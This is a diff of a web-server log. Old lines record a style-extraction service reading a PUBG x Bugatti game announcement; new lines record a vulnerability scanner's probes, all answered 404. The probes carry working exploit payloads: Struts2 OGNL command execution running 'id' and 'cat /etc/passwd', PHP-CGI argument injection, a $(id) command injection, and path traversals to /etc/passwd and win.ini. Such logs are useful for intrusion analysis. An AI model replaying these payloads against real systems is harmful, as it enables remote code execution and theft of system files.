@@ -1,194 +1,154 @@
 nohup: ignoring input
-INFO:     Started server process [2432759]
+INFO:     Started server process [3665140]
 INFO:     Waiting for application startup.
 INFO:     Application startup complete.
 INFO:     Uvicorn running on http://0.0.0.0:8002 (Press CTRL+C to quit)
-2025-09-25 11:50:15.972 | INFO     | preprocess.article_analyzer:analyze_article:41 - 开始读取文章：### PUBG x Bugatti
-
-#### ANNOUNCEMENT
-2025.08.13
-
-**※ All featured items may become available again at a later date via the Workshop, Your Shop, or other in-game features, as well as various events and promotions.**  
-※ The sales periods shown below are subject to change.
-
----
-
-### Bugatti in PUBG: BATTLEGROUNDS
-
-The hyper sports car that transcends all limits of luxury and performance — the incomparable Bugatti Chiron roars across the Battlegrounds.
-
-Bugatti, designer of hyper sports cars combining elegance and performance, is more than just a car brand. For over a century, it has defined the pinnacle of design, speed, and technology without compromise. Hand-assembled in Molsheim, France, every Bugatti embodies the brand’s ethos of excellence in design and engineering, captivating enthusiasts around the world.
-
-Even in the earliest days of handcrafted automobiles, Bugatti stood out with unmatched precision and innovation. Its legacy is simply incomparable.
-
-Through the PUBG x Bugatti collaboration, players can take the wheel of the Chiron, the ultimate symbol of performance and comfort. A modern reinterpretation of Bugatti’s iconic history, the Chiron pushes boundaries beyond imagination, combining sophisticated design, performance-oriented form, and a whole new dimension of comfort. **With only 500 units ever made, the Chiron’s striking presence and elegance now await you on the Battlegrounds.**
-
-Step into the world of PUBG x Bugatti, where every drive defies expectations — because nothing else compares.
-
-*If comparable, it is no longer Bugatti.*
-
----
-
-## Collaboration: Bugatti
-
-### Bugatti Container
-
-[![Bugatti Container](https://wstatic-prod-boc.krafton.com/common/news/20250812/a6UPhaTU.jpg)](https://wstatic-prod-boc.krafton.com/common/news/20250812/a6UPhaTU.jpg)
-
-- An exclusive Bugatti container is available on the starting islands of Erangel, Miramar, Sanhok, Vikendi, Taego, Deston, and Rondo.
-- The container can only be unlocked by players who own Bugatti skins.
-    + If multiple Bugatti skins are concurrently equipped, the system will randomly select one to display.
-- Only the player who unlocks the container and their teammates can operate or ride in the Bugatti vehicle.
-- This feature can be utilized from the start of the match until players board the plane; once they do, the previously positioned container and the Bugatti vehicle will disappear.
-- Available in Normal Match, Ranked, and Casual Mode.
-- The Bugatti containers are available for one month.
-
----
-
-## Special Vehicle Skins: Bugatti
-[![Bugatti Special Vehicle Skin](https://wstatic-prod-boc.krafton.com/common/news/20250812/oHJugUBJ.jpg)](https://wstatic-prod-boc.krafton.com/common/news/20250812/oHJugUBJ.jpg)
-
-Details on the Bugatti Special Vehicle skins are as below.
-
-***※ Special Vehicle skins transform the existing vehicles to reflect the designs of the actual vehicles, and these Special Vehicle skins are developed to ensure a faithful representation of the actual vehicle's 3D modeling. Please note that equipping the Bugatti Special Vehicle skins may result in slight alterations to the base vehicle's size and appearance. These alterations are similar to those of the previous Special Vehicle skins.***
-
-#### Common Features
-
-- When equipping a Special Vehicle skin, the following effects will apply:
-    + Vehicle appearance is changed.
-    + Vehicle sounds, such as driving/honking sounds, are changed.
-- Even after equipping the Special Vehicle skin, HP, performance, weight, fuel level, driving method, etc. are maintained based on the condition of the vehicle before equipping the skin.
-- Lobby animations are applied for each skin.
-- The signature number badge is displayed on the front horseshoe grill when certain paint items are applied.
-
-##### Carbon Fiber
-
-- Parts of the vehicle’s rear and engine cover are made of carbon fiber.
-- Carbon fiber is a penetrable material, allowing bullets to pass through and inflict damage upon the player.
-    + If the player is shot through the carbon fiber material, both the vehicle and the player will take damage.
-    + Damage is applied to the vehicle when the bullet penetrates the carbon fiber area, but there is no additional damage caused by the bullet hitting the inside of the vehicle post-penetration.
-- The carbon fiber material can only be penetrated by bullets.
-
-#### "Chiron" Sports Car
-
-- Applicable vehicle: Coupe RB
-- Boost effect is applied.
-
-#### "Chiron (Édition Spéciale)" Sports Car
-
-- Applicable vehicle: Coupe RB
-
-##### Special Features
-
-- Active Rear Wing
-    + The rear spoiler will be activated upon reaching a certain speed.
-    + The function cannot be canceled after activation.
-    + When the rear spoiler is activated, applying the brakes changes its angle.
-- Custom Boost effect
-- Custom Boost sound
-
----
-
-## Workshop: Bugatti
-
-Want the full PUBG x Bugatti experience? Check out the Workshop to make it yours.
-
-### Loot Cache Fragment
-
-- Collect 10 Bugatti Loot Cache Fragments to craft one Bugatti Loot Cache at Workshop - Regular Crafting.
-- Various events where you can earn Bugatti Loot Cache Fragments are available. Check the **August Special Drops announcement** for all the details!
-
-### Special Crafting
-
-Head to the Workshop → Special Crafting to craft special Bugatti items. Don't miss out on the Special Crafting exclusive items!
-
-- Special Vehicle skins along with exclusive customizable items have been added to the Workshop.
-- A total of 27 items are craftable with Bugatti Tokens at Special Crafting.
-
-[![Bugatti Special Crafting](https://wstatic-prod-boc.krafton.com/common/news/20250812/yULgeuQP.jpg)](https://wstatic-prod-boc.krafton.com/common/news/20250812/yULgeuQP.jpg)
-
-#### Special Crafting Closing Date (UTC)
-
-※ The Special Crafting - Bugatti Crafting tab will be accessible only until the following dates. Make sure to use up your Tokens before the closing date!
-
-- PC: September 15, 00:00
-- Console: September 23, 00:00
-
-#### Craftable Items
-
-***※ The Carbon Wrap paints only affect the vehicle’s color. These paints are purely cosmetic and not related to the penetrable carbon fiber material.***
-
-部分外观展示：
-
-- Chiron (Édition Spéciale) Full Set (Giallo & Dark Blue)
-    [![Chiron Giallo & Dark Blue](https://wstatic-prod-boc.krafton.com/common/news/20250812/uf5EtvRQ.png)](https://wstatic-prod-boc.krafton.com/common/news/20250812/uf5EtvRQ.png)
-- Chiron (Édition Spéciale) Exterior Set (French Racing Blue & Le Patron)
-    [![Chiron French Racing Blue & Le Patron](https://wstatic-prod-boc.krafton.com/common/news/20250812/LDZ24OuA.png)](https://wstatic-prod-boc.krafton.com/common/news/20250812/LDZ24OuA.png)
-- Chiron (Édition Spéciale) Exterior Set (Italian Red & Black)
-    [![Chiron Italian Red & Black](https://wstatic-prod-boc.krafton.com/common/news/20250812/abRN2Kvw.png)](https://wstatic-prod-boc.krafton.com/common/news/20250812/abRN2Kvw.png)
-- Chiron (Édition Spéciale) Exterior Set (Phantom Chrome & Black)
-    [![Chiron Phantom Chrome & Black](https://wstatic-prod-boc.krafton.com/common/news/20250812/leMchxPA.png)](https://wstatic-prod-boc.krafton.com/common/news/20250812/leMchxPA.png)
-- Chiron Exterior Set (Ruby)
-    [![Chiron Ruby](https://wstatic-prod-boc.krafton.com/common/news/20250812/xtbdN7Ei.png)](https://wstatic-prod-boc.krafton.com/common/news/20250812/xtbdN7Ei.png)
-
-#### Special Disassembly
-
-- Earn Bugatti Tokens through Special Disassembly by disassembling Imprints obtainable from the Bugatti Prime Parcel.
-    + You can choose between Regular Disassembly or Special Disassembly in Workshop - Regular Crafting - Craft tab.
-
-***※ The Chiron (Édition Spéciale) Paint (Black Carbon Wrap) is only obtainable from the Bugatti Prime Parcel.***
-
----
-
-## Store
-
-Check out the Bugatti Step Up Packs, available at up to 80% off and now featuring 5 sets. Also, don’t forget the Loot Cache Packs!
-
-### Step Up Packs
-[![Bugatti Step Up Packs](https://wstatic-prod-boc.krafton.com/common/news/20250812/9Fpsru0q.jpg)](https://wstatic-prod-boc.krafton.com/common/news/20250812/9Fpsru0q.jpg)
-
-*Due to legal regulations, the Step Up Packs are not available for purchase in Belgium and the Netherlands.*
-
-***All items in the Step Up Packs can be purchased once per account.***
-
-#### Sales Period (UTC)
-
-- PC: August 13, after live server maintenance - September 10, 00:00
-- Console: August 21, after live server maintenance - September 18, 00:00
-
-### Loot Cache Packs
-[![Bugatti Loot Cache Packs](https://wstatic-prod-boc.krafton.com/common/news/20250812/asxSrz4U.jpg)](https://wstatic-prod-boc.krafton.com/common/news/20250812/asxSrz4U.jpg)
-
-*Due to legal regulations, the Loot Cache Packs are not available for purchase in Belgium and the Netherlands.*
-
-***The Currency Selection feature is available for the Bugatti Loot Cache Pack (x1), allowing you to purchase up to 50 using either G-Coin or BP.***
-
-#### Sales Period (UTC)
-
-- PC: August 13, after live server maintenance - September 10, 00:00
-- Console: August 21, after live server maintenance - September 18, 00:00
-
-#### Bugatti Token Expiry Date (UTC)
-
-※ Expired tokens disappear and cannot be exchanged or refunded.
-- PC: September 15, 00:00
-- Console: September 23, 00:00
-
-#### Preview
-
-- Previews are available for all items included in the Loot Cache Packs.
-- Expiry dates for Bugatti Tokens are displayed in the Store preview.
-
----
-
-Command the Battlegrounds with incomparable elegance and performance.
-
-Meet PUBG x Bugatti.
-
-作者：PUBG: BATTLEGROUNDS Team  
-发布日期：2025.08.13
-2025-09-25 11:50:15.972 | INFO     | preprocess.article_analyzer:analyze_article:43 - 文章读取完成，总长度：9484字
-2025-09-25 11:50:42.088 | INFO     | preprocess.article_analyzer:analyze_article:46 - 文风特征提取完成
-Token usage: 3750 input + 2179 output = 5929 total
-Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
-INFO:     9.134.51.90:49900 - "POST /extract-style HTTP/1.1" 200 OK
+INFO:     9.135.100.135:39846 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:34614 - "OPTIONS / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:34592 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:60456 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60478 - "GET http%3A//9.139.82.162/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60484 - "GET http%3A//10.99.229.178/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60488 - "GET http%3A//9.218.232.52/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60490 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60528 - "GET /cgi-bin/gateway/agentinfo HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60528 - "POST /run HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60528 - "GET /api/session/properties HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:60528 - "GET /console/css/%252e%252e%252f/consolejndi.portal HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60728 - "POST /scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60730 - "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60732 - "POST /user.action HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60734 - "GET /index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60736 - "GET /login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60742 - "GET /index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60744 - "GET /index.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60746 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60758 - "GET /login.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60776 - "GET /index.action?action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60794 - "GET /index.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60814 - "GET /login.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60830 - "GET /index.action?redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32792 - "POST /?q=node&destination=node HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32794 - "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32806 - "PUT /fileserver/33CMVgNetXpu2UAKKDJf6xvO8MP.txt HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32816 - "GET /fileserver/33CMVgNetXpu2UAKKDJf6xvO8MP.txt HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32866 - "POST /invoker/JMXInvokerServlet/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32886 - "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32896 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:32900 - "POST /invoker/readonly HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32950 - "POST /?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32958 - "PUT /_users/org.couchdb.user%3Apoc HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32974 - "POST /integration/saveGangster.action HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33010 - "GET /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33028 - "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33032 - "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33064 - "GET /?id=TeGcUq%25{128*128} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33078 - "GET /solr/admin/cores?wt=json HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33082 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33086 - "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33124 - "POST /jars/upload HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33138 - "POST /_async/AsyncResponseService HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33142 - "GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33148 - "GET /_async/favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33154 - "GET /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33158 - "GET /lua/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33170 - "GET /lua/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33308 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33334 - "POST /minio/bootstrap/v1/verify HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33336 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33358 - "GET /public/plugins/alertlist/../../../../../conf/defaults.ini HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33362 - "GET /webui/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33374 - "POST /services/messagebroker/streamingamf HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33406 - "POST /v6.58/Products/Authentication HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33588 - "GET /config HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33606 - "POST /component_server HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33604 - "POST /app/rest/users/id%3A1/tokens/33CMVhwJzY9LltKrIy0jrzCzbAN%3B.jsp?jsp_precompile=true HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33624 - "GET /storage/logs/laravel.log HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33662 - "GET /streampipes-backend/api/v2/auth/settings HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33682 - "GET /streampipes-backend/api/openapi.json HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33708 - "GET /tmp/temp.db%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33710 - "POST /webtools/control/main/ProgramExport HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33714 - "GET /api/data HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33722 - "GET /mnt/ram/var/log/httpd.log%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33738 - "POST /client/api?command=samlSso HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33758 - "GET /solr/admin/info/properties%3A/admin/info/key HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33764 - "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33768 - "POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33770 - "POST /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33778 - "POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33780 - "POST /test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33784 - "POST /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33788 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33804 - "GET /users%3B. HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33854 - "POST /api/v0/train HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33868 - "POST /dataSetParam/verification%3Bswagger-ui/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33882 - "GET /login?next=/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33910 - "POST / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33922 - "POST / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33938 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33946 - "GET /%40fs/C%3A/windows/win.ini?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33954 - "GET /%40fs/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33962 - "GET /%40fs/../../../../../../../etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33970 - "GET /%40fs/%252e%252e/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33988 - "GET /index.php?p=admin/actions/assets/generate-transform HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34000 - "POST /api/v1/validate/code HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34008 - "GET /portalapi/v1/roles/option%3B/v1/ping HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34036 - "GET /public/template.cgi?templatefile=$(id) HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34116 - "GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=app HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34144 - "POST /api/jmeter/download/files HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34220 - "GET /camunda/app/welcome/default/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34262 - "GET /?query=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34406 - "POST /api/snapshots HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34414 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34436 - "POST /api/snapshots HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34448 - "GET /apisix/admin/migrate/export HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34460 - "GET /version HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34486 - "GET /druid/submitLogin HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34498 - "GET /install.php?profile=default HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34506 - "GET /core/install.php HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34512 - "GET /api/dev/metrics/relation HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34518 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34520 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34522 - "POST /index.php?r=site/user-login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34556 - "POST /hub/login?next HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34562 - "GET /./../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34566 - "POST /hub/login?next HTTP/1.1" 404 Not Found
